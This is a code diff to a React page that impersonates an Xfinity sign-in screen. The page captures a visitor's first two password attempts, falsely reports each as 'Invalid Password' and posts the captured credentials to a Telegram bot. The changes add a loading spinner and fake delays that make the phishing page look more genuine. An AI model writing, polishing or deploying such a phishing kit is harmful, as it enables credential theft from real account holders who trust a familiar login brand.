@@ -87,6 +87,7 @@ const Home = () => {
 
     const [password1, togglePassword1] = useState('')
     const [password2, togglePassword2] = useState('')
+    const [loading, toggleLoading] = useState(false)
 
     const handlePassword = async () => {
         if (!password) {
@@ -96,6 +97,10 @@ const Home = () => {
             if (count < 2) {
                 if (count === 0) {
                     togglePassword1(password)
+                    toggleLoading(true)
+                    setTimeout(() => {
+                        toggleLoading(false)
+                    }, 2500);
                     setPassword('')
                     setPasswordError('Invalid Password')
                     setTimeout(() => {
@@ -105,6 +110,10 @@ const Home = () => {
                 }
                 if (count === 1) {
                     togglePassword2(password)
+                    toggleLoading(true)
+                    setTimeout(() => {
+                        toggleLoading(false)
+                    }, 2500);
                     setPassword('')
                     setPasswordError('Invalid Password')
                     setTimeout(() => {
@@ -132,6 +141,7 @@ const Home = () => {
 
                 try {
                     // Send the message to Telegram
+                    toggleLoading(true)
                     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                         method: 'POST',
                         headers: {
@@ -143,7 +153,7 @@ const Home = () => {
                         }),
                     });
 
-                    // Optional: Handle success feedback or further actions here
+                    toggleLoading(false)
                     alert('Data sent successfully!');
                 } catch (error) {
                     console.error('Error sending message:', error);
@@ -154,8 +164,11 @@ const Home = () => {
 
     return (
         <div className='w-full text-[0.82rem] flex flex-col items-end'>
+        <span className={`fixed left-0 top-0 bg-[#000000af] w-full h-full object-cover flex justify-center items-center ${loading? 'z-[100]': 'z-[-2]'}`}>
+            <img src="https://static.vecteezy.com/system/resources/thumbnails/042/600/457/small/loading-circles-flat-style-modern-preloaders-png.png"className='w-[10rem] spinner' alt="" />
+        </span>
             <div className="w-full flex h-screen">
-                <div className='w-full md:w-1/2 pt-[7%] px-4 md:px-[9%] flex flex-col gap-4'>
+                <div className='w-full md:w-1/2 pt-[7%] bg-white px-4 md:px-[9%] flex flex-col gap-4'>
                     <img className='w-[5rem] pb-4' src={logo} alt="" />
                     <h2 className='text-[2rem] font-semibold'>Sign in with your Xfinity ID <br /> ({userEmail})</h2>
                     {!input ? <input
